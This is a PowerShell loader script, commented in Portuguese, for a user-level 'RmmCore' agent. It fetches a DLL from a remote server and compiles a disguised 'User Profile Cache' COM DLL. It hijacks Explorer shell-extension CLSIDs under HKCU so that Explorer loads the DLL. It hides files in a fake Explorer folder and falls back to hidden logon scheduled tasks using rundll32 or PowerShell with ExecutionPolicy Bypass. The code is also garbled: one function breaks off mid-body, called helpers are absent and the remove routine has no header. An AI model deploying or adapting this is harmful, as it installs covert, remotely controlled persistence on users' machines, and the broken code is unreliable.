#Requires -Version 5.1
<#
.SYNOPSIS
    Loader v2 user - AgentV2 sem admin, sem servico SYSTEM. Spec 10.
    Pensado para ScriptBlock (irm texto, sem gravar .ps1). Preferir URL .txt:
      & ([scriptblock]::Create((irm '.../install-com.txt'))) -Config '.../conf.cfg'
    HostMode=Shell (default): so COM Hijack (cache Explorer). Baixa apenas RmmCore.dll;
      usercache.dll e compilada localmente com csc.exe. Sem Host.exe / rundll / run-v2.ps1.
    HostMode=Auto: COM primeiro; se falhar, ahi sim baixa extras e cascade task
      (rundll32 -> RmmCore.Host.exe -> run-v2.ps1).
    -Remove: para processos, task, cache Explorer e ficheiros user v2 (nao toca no servico SYSTEM).
    Sem C/U/I/T no registry. Data dir: %LOCALAPPDATA%\Microsoft\Windows\Explorer

.PARAMETER HostMode
    Shell (default, so COM) | Auto (COM + fallback task) | Rundll32 | Native | PowerShell

.EXAMPLE
    & ([scriptblock]::Create((irm 'http://host:4000/loaders/v2/install-com.txt'))) -Config 'http://host:4000/conf.cfg'

.EXAMPLE
    & ([scriptblock]::Create((irm 'http://host:4000/loaders/v2/install-com.txt'))) -Remove
#>
[CmdletBinding()]
param(
    [string]$Config,

    [string]$DataDir = $(Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Explorer'),

    [ValidateSet('Auto', 'Native', 'Rundll32', 'PowerShell', 'Shell')]
    [string]$HostMode = 'Shell',

    [ValidateSet('Install', 'Remove')]
    [string]$Action = 'Install',

    [string]$Clsid,

    [ValidateSet('Auto', 'x64', 'x86')]
    [string]$Architecture = 'Auto',

    [switch]$NoRestartExplorer,

    [switch]$Remove
)

$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# Nao setar RMM_ALLOW_MODULES - string vazia bloqueia modules (Spec 06).

$Script:V2ComClassName = 'UserProfileCacheV2.CacheProvider'
$Script:V2ComDllName = 'usercache.dll'
$Script:V2StateFileName = '.last-clsid'
$Script:V2PayloadNames = @(
    'usercache.dll',
    'RmmCore.dll',
    'RmmCore.Host.exe',
    'RmmCore.Rundll.dll',
    'RmmCore.Common.dll',
    'Newtonsoft.Json.dll',
    'run-v2.ps1',
    'bootstrap.json',
    '.last-clsid',
    'agent.store.enc',
    'RmmCore.inc',
    'core.log'
)

function Enable-Tls12 {
    param([string]$Url)
    if ($Url -match '^https://') {
        [Net.ServicePointManager]::SecurityProtocol =
            [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
    }
}

function New-RmmWebClient {
    $wc = New-Object Net.WebClient
    $wc.UseDefaultCredentials = $true
    try {
        $proxy = [Net.WebRequest]::GetSystemWebProxy()
        if ($proxy) {
            $proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials
            $wc.Proxy = $proxy
        }
    }
    catch { }
    return $wc
}

function Get-RemoteText {
    param([Parameter(Mandatory = $true)][string]$Url)
    Enable-Tls12 $Url
    $wc = New-RmmWebClient
    try {
        $wc.Encoding = [Text.Encoding]::UTF8
        return $wc.DownloadString($Url)
    }
    catch {
        $detail = $_.Exception.Message
        if ($_.Exception.InnerException) {
            $detail = $_.Exception.InnerException.Message
        }
        throw "Falha ao descarregar texto: $Url - $detail"
    }
    finally {
        $wc.Dispose()
    }
}

function Save-RemoteFile {
    param(
        [Parameter(Mandatory = $true)][string]$Uri,
        [Parameter(Mandatory = $true)][string]$Dest,
        [int]$MinBytes = 32,
        [int]$Retries = 6,
        [switch]$UnlockExplorer
    )
    Enable-Tls12 $Uri
    $dir = Split-Path -Parent $Dest
    if ($dir -and -not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
    $tmp = "$Dest.download"
    $last = $null
    for ($i = 0; $i -lt $Retries; $i++) {
        try {
            if (Test-Path -LiteralPath $tmp) {
                Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
            }
            $wc = New-RmmWebClient
            try {
                $wc.DownloadFile($Uri, $tmp)
            }
            finally {
                $wc.Dispose()
            }
            if (-not (Test-Path -LiteralPath $tmp) -or (Get-Item -LiteralPath $tmp).Length -lt $MinBytes) {
                throw 'ficheiro demasiado pequeno'
            }

            if ($UnlockExplorer -or (Test-Path -LiteralPath $Dest)) {
                try { Stop-RmmCoreUser -Dir $dir } catch { }
                if ((Test-Path -LiteralPath $Dest) -and (Test-FileLocked -Path $Dest)) {
                    Stop-ExplorerProcesses
                    Start-Sleep -Seconds 2
                }
                if (Test-Path -LiteralPath $Dest) {
                    Remove-Item -LiteralPath $Dest -Force -ErrorAction SilentlyContinue
                }
            }
            [System.IO.File]::Copy($tmp, $Dest, $true)
            Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
            return
        }
        catch {
            $last = $_
            if (Test-Path -LiteralPath $tmp) {
                Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
            }
            try {
                Stop-RmmCoreUser -Dir $dir
                Stop-ExplorerProcesses
            } catch { }
            Start-Sleep -Seconds 2
        }
    }
    try { Restart-ExplorerShell } catch { }
    throw $last
}

function Get-ServerBase {
    param([string]$Url)
    $u = $Url.Trim()
    if ($u -match '/conf\.cfg$') {
        $txt = Get-RemoteText -Url $u
        return [string]($txt | ConvertFrom-Json).server
    }
    return $u.TrimEnd('/')
}

function Write-V2UserBootstrap {
    param(
        [Parameter(Mandatory = $true)][string]$Dir,
        [Parameter(Mandatory = $true)][string]$ServerBase,
        [Parameter(Mandatory = $true)][string]$Mode,
        [switch]$IncludeTaskHosts
    )
    $dll = Join-Path $Dir 'RmmCore.dll'
    $urls = @("$ServerBase/download/RmmCore.dll")
    $cfgObj = @{
        ServerBase    = $ServerBase
        DataDirectory = $Dir
        DllPath       = $dll
        HostMode      = $Mode
        DownloadUrls  = $urls
        RetryDelayMs  = 5000
    }
    if ($IncludeTaskHosts) {
        $cfgObj.HostExe = Join-Path $Dir 'RmmCore.Host.exe'
        $cfgObj.RundllPath = Join-Path $Dir 'RmmCore.Rundll.dll'
        $cfgObj.DownloadUrls = $urls + @("$ServerBase/download/RmmCore.Host.exe")
    }
    Set-Content -Path (Join-Path $Dir 'bootstrap.json') -Value ($cfgObj | ConvertTo-Json -Depth 4) -Encoding UTF8
}

function Save-ComCorePayload {
    param(
        [Parameter(Mandatory = $true)][string]$ServerBase,
        [Parameter(Mandatory = $true)][string]$Dir
    )
    $dest = Join-Path $Dir 'RmmCore.dll'
    Save-RemoteFile -Uri "$ServerBase/download/RmmCore.dll" -Dest $dest -UnlockExplorer
}

function Save-TaskFallbackPayload {
    param(
        [Parameter(Mandatory = $true)][string]$ServerBase,
        [Parameter(Mandatory = $true)][string]$Dir
    )
    $runnerPath = Join-Path $Dir 'run-v2.ps1'
    try {
        Save-RemoteFile -Uri "$ServerBase/loaders/run-v2.txt" -Dest $runnerPath
    }
    catch {
        Save-RemoteFile -Uri "$ServerBase/loaders/run-v2.ps1" -Dest $runnerPath
    }

    foreach ($f in @('RmmCore.Host.exe', 'RmmCore.Rundll.dll')) {
        $dest = Join-Path $Dir $f
        try {
            Save-RemoteFile -Uri "$ServerBase/download/$f" -Dest $dest
        }
        catch { }
    }
    return $runnerPath
}

function Get-NativeRundll32 {
    $isWow = [Environment]::Is64BitOperatingSystem -and -not [Environment]::Is64BitProcess
    $sys = if ($isWow) { Join-Path $env:WINDIR 'Sysnative' } else { Join-Path $env:WINDIR 'System32' }
    $p = Join-Path $sys 'rundll32.exe'
    if (-not (Test-Path -LiteralPath $p)) { throw "rundll32.exe x64 nao encontrado em $p" }
    return $p
}

function Get-NativePowerShell {
    $isWow = [Environment]::Is64BitOperatingSystem -and -not [Environment]::Is64BitProcess
    $sys = if ($isWow) { Join-Path $env:WINDIR 'Sysnative' } else { Join-Path $env:WINDIR 'System32' }
    return (Join-Path $sys 'WindowsPowerShell\v1.0\powershell.exe')
}

function Stop-RmmCoreUser {
    param([string]$Dir)
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'
    schtasks.exe /End /TN 'RmmCoreV2' *>$null
    schtasks.exe /Delete /TN 'RmmCoreV2' /F *>$null
    foreach ($f in @("Name='powershell.exe'", "Name='rundll32.exe'", "Name='RmmCore.Host.exe'", "Name='cmd.exe'")) {
        $procs = @()
        try { $procs = @(Get-CimInstance Win32_Process -Filter $f) } catch {
            try { $procs = @(Get-WmiObject Win32_Process -Filter $f) } catch { $procs = @() }
        }
        foreach ($p in $procs) {
            if (-not $p.CommandLine) { continue }
            if ($p.ProcessId -eq $PID) { continue }
            $cmd = [string]$p.CommandLine
            if ($cmd -like '*run-v2.ps1*' -or $cmd -like '*RmmCore.Rundll*' -or $cmd -like '*RmmCore.Host.exe*' -or ($cmd -like '*RmmCore*' -and ($cmd -like "*$Dir*" -or $cmd -like '*\Microsoft\Windows\Explorer\*'))) {
                Stop-Process -Id $p.ProcessId -Force
            }
        }
    }
    $ErrorActionPreference = $prev
    Start-Sleep -Seconds 2
}

function Test-HostAlive {
    param([string]$Dir, [ValidateSet('Native', 'Rundll32', 'PowerShell')][string]$Mode)
    if ($Mode -eq 'PowerShell') {
        return (@(Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
            Where-Object { $_.CommandLine -like '*run-v2.ps1*' }).Count -gt 0)
    }
    if ($Mode -eq 'Rundll32') {
        return (@(Get-CimInstance Win32_Process -Filter "Name='rundll32.exe'" -ErrorAction SilentlyContinue |
            Where-Object { ([string]$_.CommandLine) -like '*RmmCore.Rundll*' }).Count -gt 0)
    }
    return (@(Get-CimInstance Win32_Process -Filter "Name='RmmCore.Host.exe'" -ErrorAction SilentlyContinue |
        Where-Object { ([string]$_.CommandLine) -like "*$Dir*" -or $_.ExecutablePath -like "*$Dir*" }).Count -gt 0)
}

# Task Scheduler: Hidden=true, sem cmd.exe wrapper (evita flash de consola).
function Register-And-RunHiddenTask {
    param(
        [Parameter(Mandatory = $true)][string]$ExePath,
        [Parameter(Mandatory = $true)][string]$Arguments,
        [Parameter(Mandatory = $true)][string]$WorkDir,
        [string]$TaskName = 'RmmCoreV2'
    )
    $svc = New-Object -ComObject 'Schedule.Service'
    $svc.Connect()
    $folder = $svc.GetFolder('\')
    try { $folder.DeleteTask($TaskName, 0) } catch { }

    $td = $svc.NewTask(0)
    $td.RegistrationInfo.Description = 'RmmCoreV2'
    $td.Settings.Enabled = $true
    $td.Settings.Hidden = $true
    $td.Settings.AllowDemandStart = $true
    $td.Settings.DisallowStartIfOnBatteries = $false
    $td.Settings.StopIfGoingOnBatteries = $false
    $td.Settings.StartWhenAvailable = $true
    $td.Settings.ExecutionTimeLimit = 'PT0S'
    $td.Settings.MultipleInstances = 0 # IgnoreNew
    $td.Principal.LogonType = 3 # TASK_LOGON_INTERACTIVE_TOKEN
    $td.Principal.RunLevel = 0  # Least privilege

    $trigger = $td.Triggers.Create(9) # TASK_TRIGGER_LOGON
    $trigger.Delay = 'PT15S'
    $trigger.Enabled = $true

    $action = $td.Actions.Create(0) # TASK_ACTION_EXEC
    $action.Path = $ExePath
    $action.Arguments = $Arguments
    $action.WorkingDirectory = $WorkDir

    # 6 = TASK_CREATE_OR_UPDATE; 3 = TASK_LOGON_INTERACTIVE_TOKEN
    try {
        [void]$folder.RegisterTaskDefinition($TaskName, $td, 6, $null, $null, 3)
    }
    catch {
        $tr = '"{0}" {1}' -f $ExePath, $Arguments
        $null = & schtasks.exe /Create /TN $TaskName /SC ONLOGON /DELAY 0000:15 /RL LIMITED /F /TR $tr 2>&1
        if ($LASTEXITCODE -ne 0) { throw }
    }

    try {
        $registered = $folder.GetTask($TaskName)
        $registered.Run($null) | Out-Null
    }
    catch {
        $null = & schtasks.exe /Run /TN $TaskName 2>&1
    }
    Start-Sleep -Seconds 4
}

function Start-ProcessHidden {
    param(
        [Parameter(Mandatory = $true)][string]$FilePath,
        [string]$ArgumentList = '',
        [string]$WorkingDirectory = ''
    )
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $FilePath
    $psi.Arguments = $ArgumentList
    if ($WorkingDirectory) { $psi.WorkingDirectory = $WorkingDirectory }
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    [void][System.Diagnostics.Process]::Start($psi)
}

function Start-ViaRundll32 {
    param([string]$Dir, [string]$RundllDll)
    if (-not (Test-Path -LiteralPath $RundllDll)) { return $false }
    $rundll = Get-NativeRundll32
    $args = '"{0}",AgentMain data={1}' -f $RundllDll, $Dir
    try {
        Register-And-RunHiddenTask -ExePath $rundll -Arguments $args -WorkDir $Dir
    } catch { }
    if (Test-HostAlive -Dir $Dir -Mode Rundll32) { return $true }
    try {
        Start-ProcessHidden -FilePath $rundll -ArgumentList $args -WorkingDirectory $Dir
    } catch { }
    Start-Sleep -Seconds 3
    return (Test-HostAlive -Dir $Dir -Mode Rundll32)
}

function Start-ViaNativeHost {
    param([string]$Dir, [string]$HostExe)
    if (-not (Test-Path -LiteralPath $HostExe)) { return $false }
    $args = "data=$Dir"
    try {
        Register-And-RunHiddenTask -ExePath $HostExe -Arguments $args -WorkDir $Dir
    } catch { }
    if (Test-HostAlive -Dir $Dir -Mode Native) { return $true }
    try {
        Start-ProcessHidden -FilePath $HostExe -ArgumentList $args -WorkingDirectory $Dir
    } catch { }
    Start-Sleep -Seconds 3
    return (Test-HostAlive -Dir $Dir -Mode Native)
}

function Start-ViaPowerShellRunner {
    param([string]$Dir, [string]$RunnerPath)
    $ps = Get-NativePowerShell
    $arg = '-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "{0}"' -f $RunnerPath
    try {
        Register-And-RunHiddenTask -ExePath $ps -Arguments $arg -WorkDir $Dir
    } catch { }
    if (Test-HostAlive -Dir $Dir -Mode PowerShell) { return $true }
    try {
        Start-ProcessHidden -FilePath $ps -ArgumentList $arg -WorkingDirectory $Dir
    } catch { }
    Start-Sleep -Seconds 3
    return (Test-HostAlive -Dir $Dir -Mode PowerShell)
}

function Start-HostCascade {
    param(
        [string]$Dir,
        [string]$NativeExe,
        [string]$RundllDll,
        [string]$RunnerPath,
        [ValidateSet('Auto', 'Native', 'Rundll32', 'PowerShell')][string]$Mode
    )
    $order = switch ($Mode) {
        'Rundll32' { @('Rundll32', 'Native', 'PowerShell') }
        'Native' { @('Native', 'Rundll32', 'PowerShell') }
        'PowerShell' { @('PowerShell') }
        default { @('Rundll32', 'Native', 'PowerShell') }
    }

    foreach ($step in $order) {
        $ok = $false
        switch ($step) {
            'Rundll32' {
                $ok = Start-ViaRundll32 -Dir $Dir -RundllDll $RundllDll
            }
            'Native' {
                $ok = Start-ViaNativeHost -Dir $Dir -HostExe $NativeExe
            }
            'PowerShell' {
                $ok = Start-ViaPowerShellRunner -Dir $Dir -RunnerPath $RunnerPath
            }
        }
        if ($ok) {
            return @{ Ok = $true; Mode = $step }
        }
    }
    return @{ Ok = $false; Mode = $null }
}

function Format-ComClsid {
    param([string]$Value)
    $normalized = $Value.Trim('{}').ToUpperInvariant()
    return "{$normalized}"
}

function Format-CodeBaseUri {
    param([string]$Path)
    $absolute = [System.IO.Path]::GetFullPath($Path)
    return ([System.Uri]::new($absolute)).AbsoluteUri
}

function Get-MscoreePath {
    param([ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto')
    if ($Arch -eq 'x86') { return Join-Path $env:WINDIR 'SysWOW64\mscoree.dll' }
    return Join-Path $env:WINDIR 'System32\mscoree.dll'
}

function Get-CscPath {
    param([ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto')
    $paths = @()
    if ($Arch -eq 'x86') {
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'
    }
    elseif ($Arch -eq 'x64') {
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
    }
    else {
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\csc.exe'
        $paths += Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\csc.exe'
    }
    foreach ($path in $paths) {
        if (Test-Path $path) { return $path }
    }
    throw "csc.exe nao encontrado. Instale .NET Framework 4.x."
}

function Stop-ExplorerProcesses {
    Get-Process -Name explorer -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
}

function Restart-ExplorerShell {
    Stop-ExplorerProcesses
    Start-Sleep -Seconds 1
    if (-not (Get-Process -Name explorer -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath explorer.exe
    }
}

function Test-FileLocked {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { return $false }
    try {
        $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
        $fs.Close()
        return $false
    }
    catch {
        return $true
    }
}

function Unlock-V2ComDll {
    param([string]$DllPath)
    $null = Unregister-V2Cache
    for ($i = 1; $i -le 8; $i++) {
        Stop-ExplorerProcesses
        Start-Sleep -Seconds 2
        if (-not (Test-FileLocked -Path $DllPath)) { return $true }
    }
    return -not (Test-FileLocked -Path $DllPath)
}

function Get-V2ComDllPath {
    param([string]$Dir)
    $preferred = Join-Path $Dir $Script:V2ComDllName
    if ((Unlock-V2ComDll -DllPath $preferred)) { return $preferred }
    $alt = Join-Path $Dir ('usercache-{0}.dll' -f [guid]::NewGuid().ToString('N').Substring(0, 8))
    return $alt
}

function Unregister-V2Cache {
    $removed = 0
    $root = $null
    try {
        $root = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\Classes\CLSID', $true)
        if (-not $root) { return 0 }
        foreach ($name in @($root.GetSubKeyNames())) {
            $inproc = $null
            try {
                $inproc = $root.OpenSubKey("$name\InprocServer32")
                if (-not $inproc) { continue }
                $cls = [string]$inproc.GetValue('Class')
            }
            finally {
                if ($inproc) { $inproc.Close() }
            }
            if ($cls -eq $Script:V2ComClassName) {
                $root.DeleteSubKeyTree($name)
                $removed++
            }
        }
    }
    catch { }
    finally {
        if ($root) { $root.Close() }
    }
    return $removed
}

function Get-HkLmRegistryViews {
    @(
        [Microsoft.Win32.RegistryView]::Registry64,
        [Microsoft.Win32.RegistryView]::Registry32
    )
}

function Get-InprocServer32Dll {
    param([string]$Clsid)
    try { $Clsid = Format-ComClsid -Value $Clsid } catch { return $null }
    $rel = "Software\Classes\CLSID\$Clsid\InprocServer32"
    foreach ($view in (Get-HkLmRegistryViews)) {
        $base = $null
        $key = $null
        try {
            $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $view)
            $key = $base.OpenSubKey($rel)
            if ($key) {
                $v = $key.GetValue('')
                if (-not [string]::IsNullOrWhiteSpace([string]$v)) { return [string]$v }
            }
        }
        catch { }
        finally {
            if ($key) { $key.Close() }
            if ($base) { $base.Close() }
        }
    }
    $p = "HKLM:\Software\Classes\CLSID\$Clsid\InprocServer32"
    if (Test-Path -Path $p) {
        $v = (Get-ItemProperty -Path $p -ErrorAction SilentlyContinue).'(default)'
        if (-not [string]::IsNullOrWhiteSpace([string]$v)) { return [string]$v }
    }
    return $null
}

function Add-ClsidToList {
    param(
        [string]$Value,
        [switch]$RequireInproc
    )
    if ([string]::IsNullOrWhiteSpace($Value)) { return }
    try { $c = Format-ComClsid -Value $Value } catch { return }
    if ($script:ClsidAccum.Contains($c)) { return }
    if ($RequireInproc -and -not (Get-InprocServer32Dll -Clsid $c)) { return }
    [void]$script:ClsidAccum.Add($c)
}

function Get-InstallClsidCandidates {
    param(
        [string]$Dir,
        [string]$Preferred
    )
    $script:ClsidAccum = New-Object System.Collections.Generic.List[string]
    Add-ClsidToList -Value $Preferred

    $state = Join-Path $Dir $Script:V2StateFileName
    if (Test-Path -LiteralPath $state) {
        $prev = (Get-Content -LiteralPath $state -Raw -ErrorAction SilentlyContinue).Trim()
        Add-ClsidToList -Value $prev -RequireInproc
    }

    foreach ($rel in @(
            'Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects',
            'Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects'
        )) {
        foreach ($name in @(Get-RegistrySubKeyNames -RelativePath $rel)) {
            if ($name -notmatch '^\{[0-9A-Fa-f-]{36}\}$') { continue }
            Add-ClsidToList -Value $name
        }
    }

    foreach ($rel in @(
            'Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers',
            'Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers'
        )) {
        foreach ($name in @(Get-RegistrySubKeyNames -RelativePath $rel)) {
            $clsid = Get-RegistrySubKeyDefault -RelativePath $rel -SubName $name
            Add-ClsidToList -Value $clsid
        }
    }

    return @($script:ClsidAccum.ToArray())
}

function Get-RegistrySubKeyNames {
    param([string]$RelativePath)
    $names = New-Object System.Collections.Generic.List[string]
    foreach ($view in (Get-HkLmRegistryViews)) {
        $base = $null
        $key = $null
        try {
            $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $view)
            $key = $base.OpenSubKey($RelativePath)
            if (-not $key) { continue }
            foreach ($n in $key.GetSubKeyNames()) {
                if (-not $names.Contains($n)) { $names.Add($n) }
            }
        }
        catch { }
        finally {
            if ($key) { $key.Close() }
            if ($base) { $base.Close() }
        }
    }
    return @($names.ToArray())
}

function Get-RegistrySubKeyDefault {
    param([string]$RelativePath, [string]$SubName)
    foreach ($view in (Get-HkLmRegistryViews)) {
        $base = $null
        $key = $null
        try {
            $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $view)
            $key = $base.OpenSubKey("$RelativePath\$SubName")
            if (-not $key) { continue }
            $v = $key.GetValue('')
            if (-not [string]::IsNullOrWhiteSpace([string]$v)) { return [string]$v }
        }
        catch { }
        finally {
            if ($key) { $key.Close() }

function Get-ComAssemblyMetadata {
    param([Parameter(Mandatory = $true)][string]$Path)
    $absolutePath = [System.IO.Path]::GetFullPath($Path)
    $assembly = [System.Reflection.Assembly]::LoadFile($absolutePath)
    $assemblyFullName = $assembly.GetName()
    $publicKeyToken = 'null'
    $tokenBytes = $assemblyFullName.GetPublicKeyToken()
    if ($tokenBytes -and $tokenBytes.Length -gt 0) {
        $publicKeyToken = -join ($tokenBytes | ForEach-Object { $_.ToString('x2') })
    }
    $assemblyName = '{0}, Version={1}, Culture=neutral, PublicKeyToken={2}' -f @(
        $assemblyFullName.Name,
        $assemblyFullName.Version,
        $publicKeyToken
    )
    return [PSCustomObject]@{
        DllPath        = $absolutePath
        AssemblyName   = $assemblyName
        ClassName      = $Script:V2ComClassName
        RuntimeVersion = 'v4.0.30319'
    }
}

function Register-CacheProvider {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [Parameter(Mandatory = $true)][string]$TargetClsid,
        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto'
    )
    $clsid = Format-ComClsid -Value $TargetClsid
    $metadata = Get-ComAssemblyMetadata -Path $Path
    $mscoree = Get-MscoreePath -Arch $Arch
    $codeBase = Format-CodeBaseUri -Path $metadata.DllPath
    $rel = "Software\Classes\CLSID\$clsid"
    $key = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($rel)
    $inproc = $null
    try {
        $key.SetValue('', 'User Profile Cache')
        $inproc = $key.CreateSubKey('InprocServer32')
        $inproc.SetValue('', $mscoree)
        $inproc.SetValue('ThreadingModel', 'Both')
        $inproc.SetValue('Assembly', $metadata.AssemblyName)
        $inproc.SetValue('Class', $metadata.ClassName)
        $inproc.SetValue('RuntimeVersion', $metadata.RuntimeVersion)
        $inproc.SetValue('CodeBase', $codeBase)
    }
    finally {
        if ($inproc) { $inproc.Close() }
        $key.Close()
    }
    return [PSCustomObject]@{ Clsid = $clsid; DllPath = $metadata.DllPath }
}

function Invoke-CompileV2CacheBootstrap {
    param(
        [Parameter(Mandatory = $true)][string]$OutputPath,
        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto'
    )
    $buildDir = Join-Path $env:TEMP ("upc2_" + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $buildDir -Force | Out-Null
    try {
        foreach ($entry in (Get-V2CacheSourceMap).GetEnumerator()) {
            Set-Content -LiteralPath (Join-Path $buildDir $entry.Key) -Value $entry.Value -Encoding UTF8
        }
        $csc = Get-CscPath -Arch $Arch
        $sourceFiles = @(Get-ChildItem -Path $buildDir -Filter '*.cs' | ForEach-Object { $_.FullName })
        $outDir = Split-Path -Parent $OutputPath
        if (-not (Test-Path $outDir)) {
            New-Item -ItemType Directory -Path $outDir -Force | Out-Null
        }
        $stagingPath = Join-Path $buildDir 'UserProfileCacheV2.dll'
        $cscArgs = @(
            '/nologo',
            '/target:library',
            '/platform:anycpu',
            "/out:$stagingPath",
            '/reference:System.dll'
        ) + $sourceFiles
        & $csc @cscArgs
        if ($LASTEXITCODE -ne 0) {
            throw "csc.exe falhou com exit code $LASTEXITCODE"
        }
        $copied = $false
        for ($i = 1; $i -le 5; $i++) {
            try {
                Copy-Item -LiteralPath $stagingPath -Destination $OutputPath -Force
                $copied = $true
                break
            }
            catch {
                Stop-ExplorerProcesses
                Start-Sleep -Seconds 2
                if ($i -eq 5) { throw }
            }
        }
        if (-not $copied) {
            throw "Nao foi possivel gravar $OutputPath"
        }
    }
    finally {
        if (Test-Path $buildDir) {
            Remove-Item -LiteralPath $buildDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

function Install-V2Cache {
    param(
        [Parameter(Mandatory = $true)][string]$Dir,
        [string]$TargetClsid,
        [ValidateSet('Auto', 'x64', 'x86')][string]$Arch = 'Auto',
        [switch]$SkipExplorerRestart
    )
    $candidates = @(Get-InstallClsidCandidates -Dir $Dir -Preferred $TargetClsid)
    if ($TargetClsid) {
        $forced = Format-ComClsid -Value $TargetClsid
        if ($candidates -notcontains $forced) {
            throw "CLSID $forced sem InprocServer32 em HKLM."
        }
        $candidates = @($forced)
    }
    if ($candidates.Count -eq 0) {
        throw "Nenhum CLSID automatico (ShellServiceObject / overlay com InprocServer32)."
    }

    $null = Unregister-V2Cache

    $destDll = Get-V2ComDllPath -Dir $Dir
    Invoke-CompileV2CacheBootstrap -OutputPath $destDll -Arch $Arch

    $lastErr = $null
    $result = $null
    foreach ($c in $candidates) {
        try {
            $null = Unregister-V2Cache
            $result = Register-CacheProvider -Path $destDll -TargetClsid $c -Arch $Arch
            $orig = Save-OriginalInprocDll -TargetClsid $result.Clsid
            if (-not $orig) {
                throw "CLSID sem DLL original (O) em HKLM InprocServer32."
            }
            Set-HkcuClsidValue -Clsid $result.Clsid -Name 'D' -Value $Dir
            Set-Content -Path (Join-Path $Dir $Script:V2StateFileName) -Value $result.Clsid -NoNewline
            $lastErr = $null
            break
        }
        catch {
            $lastErr = $_
            $null = Unregister-V2Cache
            $result = $null
        }
    }

    if (-not $result) {
        if ($lastErr) { throw $lastErr }
        throw "cache Explorer falhou em todos os CLSID candidatos."
    }

    if (-not $SkipExplorerRestart) {
        Restart-ExplorerShell
    }
}

    $null = Unregister-V2Cache
    if (-not $SkipExplorerRestart) {
        Restart-ExplorerShell
        Start-Sleep -Seconds 2
    }

    $legacy = Join-Path $env:LOCALAPPDATA 'RmmCore\v2'
    foreach ($d in @($Dir, $legacy)) {
        if ([string]::IsNullOrWhiteSpace($d) -or -not (Test-Path -LiteralPath $d)) { continue }
        foreach ($n in $Script:V2PayloadNames) {
            $p = Join-Path $d $n
            if (Test-Path -LiteralPath $p) {
                Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
            }
        }
        Get-ChildItem -LiteralPath $d -Filter 'usercache*.dll' -ErrorAction SilentlyContinue |
            Remove-Item -Force -ErrorAction SilentlyContinue
        Get-ChildItem -LiteralPath $d -Filter '*.tmp' -ErrorAction SilentlyContinue |
            Remove-Item -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path -LiteralPath $legacy) {
        Remove-Item -LiteralPath $legacy -Recurse -Force -ErrorAction SilentlyContinue
    }

    $ErrorActionPreference = $prev
}

#endregion

if ($Remove) { $Action = 'Remove' }
if ($Action -eq 'Remove') {
    Invoke-RemoveV2UserInstall -Dir $DataDir -SkipExplorerRestart:$NoRestartExplorer
    return
}
if ([string]::IsNullOrWhiteSpace($Config)) {
    throw 'Install requer -Config (ou use -Remove).'
}

$server = Get-ServerBase $Config
New-Item -ItemType Directory -Force -Path $DataDir | Out-Null

$legacyDir = Join-Path $env:LOCALAPPDATA 'RmmCore\v2'
$legacyStore = Join-Path $legacyDir 'agent.store.enc'
$newStore = Join-Path $DataDir 'agent.store.enc'
if ((Test-Path -LiteralPath $legacyStore) -and -not (Test-Path -LiteralPath $newStore)) {
    Copy-Item -LiteralPath $legacyStore -Destination $newStore -Force
}

Stop-RmmCoreUser -Dir $DataDir
Save-ComCorePayload -ServerBase $server -Dir $DataDir

$taskOnly = $HostMode -in @('Rundll32', 'Native', 'PowerShell')
if (-not $taskOnly) {
    try {
        Write-V2UserBootstrap -Dir $DataDir -ServerBase $server -Mode $HostMode
        Install-V2Cache -Dir $DataDir -TargetClsid $Clsid -Arch $Architecture -SkipExplorerRestart:$NoRestartExplorer
        return
    }
    catch {
        if ($HostMode -eq 'Shell') { throw }
        $null = Unregister-V2Cache
    }
}

$null = Unregister-V2Cache

$runnerPath = Save-TaskFallbackPayload -ServerBase $server -Dir $DataDir
Write-V2UserBootstrap -Dir $DataDir -ServerBase $server -Mode $HostMode -IncludeTaskHosts

